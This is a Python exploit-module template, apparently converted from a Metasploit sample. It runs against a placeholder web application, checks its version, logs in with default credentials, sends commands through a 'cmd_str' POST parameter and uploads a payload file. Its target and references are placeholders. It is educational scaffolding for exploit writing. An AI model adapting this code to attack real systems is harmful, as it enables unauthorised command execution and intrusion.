#!/usr/bin/env python3
"""
Sample Webapp Exploit - Python Version

This exploit module illustrates how a vulnerability could be exploited in a webapp.
This is an educational example demonstrating web application exploit techniques.

Converted from Ruby to Python as part of the post-2020 Python migration.
"""

import sys
import os
import re
from typing import Optional, Dict, Any
from base64 import b64encode

# Add python_framework to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../python_framework'))

from core.exploit import (
    RemoteExploit, ExploitInfo, ExploitTarget, ExploitOption, ExploitResult,
    ExploitRank, Platform, TargetArch, PayloadType, CheckCode
)
from helpers.http_client import HttpExploitMixin


class SampleWebappExploit(RemoteExploit, HttpExploitMixin):
    """
    Sample Web Application Exploit
    
    This module demonstrates how to write an exploit for a web application vulnerability.
    It shows:
    - Version detection
    - Authentication
    - Command injection
    - Various HTTP request patterns
    """
    
    def __init__(self):
        # Define exploit information
        info = ExploitInfo(
            name="Sample Webapp Exploit",
            description="""
            This exploit module illustrates how a vulnerability could be exploited
            in a webapp. It demonstrates common patterns including:
            - Version detection and vulnerability checking
            - Authentication (both Basic Auth and form-based)
            - Command injection through POST parameters
            - File upload exploitation
            """,
            author=[
                "h00die <mike@stcyrsecurity.com>",  # original msf module
                "researcher",  # original PoC, analysis
                "GitHub Copilot"  # Python conversion
            ],
            references=[
                "OSVDB-12345",
                "EDB-12345",
                "CVE-1978-1234",
                "http://www.example.com"
            ],
            disclosure_date="2023-12-30",
            rank=ExploitRank.NORMAL,
            # Platform refers to the language/runtime of the webapp
            platform=[Platform.LINUX],  # Python webapp runs on Linux/Unix
            arch=[TargetArch.CMD],  # We're executing commands
            privileged=False,
            targets=[
                ExploitTarget(
                    name="Automatic Target",
                    platform=[Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.UNIX_CMD
                )
            ],
            default_target=0,
            notes={
                "Stability": ["CRASH_SAFE"],
                "Reliability": ["REPEATABLE_SESSION"],
                "SideEffects": ["IOC_IN_LOGS"]
            }
        )
        
        super().__init__(info)
        
        # Set default options
        self.set_option('RPORT', 80)
        
        # Register additional options specific to this exploit
        self.register_options([
            ExploitOption('TARGETURI', True, 'The URI of the Example Application', '/example/'),
            ExploitOption('USERNAME', True, 'User to login with', 'admin'),
            ExploitOption('PASSWORD', False, 'Password to login with', '123456')
        ])
    
    def _parse_version(self, version_str: str) -> tuple:
        """Parse version string into tuple for comparison"""
        try:
            parts = version_str.split('.')
            return tuple(int(p) for p in parts[:2])
        except (ValueError, AttributeError):
            return (0, 0)
    
    def check(self) -> CheckCode:
        """
        Check if the target is vulnerable by detecting the version number
        
        Returns:
            CheckCode indicating vulnerability status
        """
        self.vprint_status("Checking target vulnerability...")
        
        try:
            # Request the index page to detect version
            uri = self.normalize_uri(self.get_option('TARGETURI'), 'index.php')
            response = self.http_get(uri)
            
            if not response:
                return CheckCode.UNKNOWN(f"{self.peer} - Could not connect to web service - no response")
            
            status_code = response.get('status_code')
            if status_code != 200:
                return CheckCode.UNKNOWN(
                    f"{self.peer} - Check URI Path, unexpected HTTP response code: {status_code}"
                )
            
            # Look for version string in HTML response
            # Example: Version: 1.2
            body = response.get('body', '')
            match = re.search(r'Version:\s*(?P<version>\d{1,2}\.\d{1,2})', body)
            
            if match:
                version = match.group('version')
                version_tuple = self._parse_version(version)
                
                # Check if version is vulnerable (1.3 or below)
                if version_tuple <= (1, 3):
                    return CheckCode.APPEARS(f"Vulnerable version detected: {version}")
                else:
                    return CheckCode.SAFE(f"Non-vulnerable version detected: {version}")
            
            return CheckCode.UNKNOWN("Could not determine version")
            
        except Exception as e:
            self.print_error(f"Error during check: {e}")
            return CheckCode.UNKNOWN(f"Error checking target: {e}")
    
    def _attempt_login(self) -> bool:
        """
        Attempt to authenticate to the web application
        
        Returns:
            True if login successful, False otherwise
        """
        self.vprint_status("Attempting login")
        
        username = self.get_option('USERNAME')
        password = self.get_option('PASSWORD')
        
        # Prepare Basic Auth header
        auth_string = b64encode(f"{username}:{password}".encode()).decode()
        
        # Attempt login with both Basic Auth and POST data
        uri = self.normalize_uri(self.get_option('TARGETURI'), 'login.php')
        
        try:
            response = self.http_post(
                uri,
                data={
                    'username': username,
                    'password': password
                },
                params={'example': 'example'},
                headers={
                    'Authorization': f'Basic {auth_string}'
                }
            )
            
            if not response:
                self.print_error(f"{self.peer} - Could not connect to web service - no response")
                return False
            
            # A valid login will give us a 301 redirect to /home.html
            status_code = response.get('status_code')
            if status_code != 301:
                self.print_error(
                    f"{self.peer} - Invalid credentials (response code: {status_code})"
                )
                return False
            
            self.print_good("Authentication successful!")
            return True
            
        except Exception as e:
            self.print_error(f"Login error: {e}")
            return False
    
    def _execute_command(self, command: str) -> bool:
        """
        Execute command through POST parameter injection
        
        Args:
            command: Command to execute
            
        Returns:
            True if command was sent successfully
        """
        self.vprint_status("Attempting command injection")
        
        try:
            # Send command through POST parameter
            uri = self.normalize_uri(self.get_option('TARGETURI'), 'command.html')
            
            response = self.http_post(
                uri,
                data={'cmd_str': command}
            )
            
            if response:
                self.vprint_good("Command injection payload sent")
                return True
            else:
                self.vprint_error("Failed to send command injection payload")
                return False
                
        except Exception as e:
            self.print_error(f"Command execution error: {e}")
            return False
    
    def _upload_file(self, filename: str, content: str) -> bool:
        """
        Upload a file via multipart form-data
        
        Args:
            filename: Name of file to upload
            content: File content
            
        Returns:
            True if upload successful
        """
        self.vprint_status(f"Attempting file upload: {filename}")
        
        try:
            uri = self.normalize_uri(self.get_option('TARGETURI'), 'async-upload.php')
            
            # Prepare multipart form data
            files = {
                'file': (filename, content, 'application/octet-stream')
            }
            data = {
                '_wpnonce': 'example'
            }
            
            response = self.http_post(
                uri,
                files=files,
                data=data
            )
            
            if response:
                self.vprint_good(f"File upload successful: {filename}")
                return True
            else:
                self.vprint_error("File upload failed")
                return False
                
        except Exception as e:
            self.print_error(f"File upload error: {e}")
            return False
    
    def exploit(self) -> ExploitResult:
        """
        Execute the exploit
        
        Returns:
            ExploitResult indicating success or failure
        """
        self.print_status(f"Exploiting {self.peer}")
        
        try:
            # Step 1: Attempt authentication
            if not self._attempt_login():
                return ExploitResult(False, "Authentication failed")
            
            # Step 2: Execute command injection
            # In a real exploit, this would use payload.encoded from the framework
            payload_cmd = self.get_option('PAYLOAD', 'whoami')
            
            if not self._execute_command(payload_cmd):
                return ExploitResult(False, "Command injection failed")
            
            # Step 3: Optional - demonstrate file upload
            # This shows how to upload a payload file
            payload_filename = "uploaded.bin"
            if hasattr(self, 'payload_encoded'):
                payload_content = self.payload_encoded
            else:
                payload_content = payload_cmd
            
            self._upload_file(payload_filename, payload_content)
            
            self.print_good("Exploit completed successfully!")
            return ExploitResult(True, "Exploit successful - command executed")
            
        except Exception as e:
            self.print_error(f"Exploit error: {e}")
            return ExploitResult(False, f"Exploit failed: {e}")


def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Sample Webapp Exploit - Educational Example"
    )
    parser.add_argument('--host', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/HTTPS')
    parser.add_argument('--uri', default='/example/', help='Target URI (default: /example/)')
    parser.add_argument('--username', default='admin', help='Username (default: admin)')
    parser.add_argument('--password', default='123456', help='Password (default: 123456)')
    parser.add_argument('--payload', default='whoami', help='Command to execute')
    parser.add_argument('--check-only', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = SampleWebappExploit()
    
    # Configure options
    exploit.set_option('RHOSTS', args.host)
    exploit.set_option('RPORT', args.port)
    exploit.set_option('SSL', args.ssl)
    exploit.set_option('TARGETURI', args.uri)
    exploit.set_option('USERNAME', args.username)
    exploit.set_option('PASSWORD', args.password)
    exploit.set_option('PAYLOAD', args.payload)
    exploit.set_option('VERBOSE', args.verbose)
    
    # Initialize HTTP client
    exploit.http_init()
    
    if args.check_only:
        # Run vulnerability check
        print("[*] Checking target vulnerability...")
        result = exploit.check()
        print(f"[*] Check result: {result}")
        return 0 if result.code in [CheckCode.VULNERABLE, CheckCode.APPEARS] else 1
    else:
        # Run exploit
        print("[*] Running exploit...")
        result = exploit.exploit()
        
        if result.success:
            print(f"[+] {result.message}")
            return 0
        else:
            print(f"[-] {result.message}")
            return 1


if __name__ == '__main__':
    sys.exit(main())
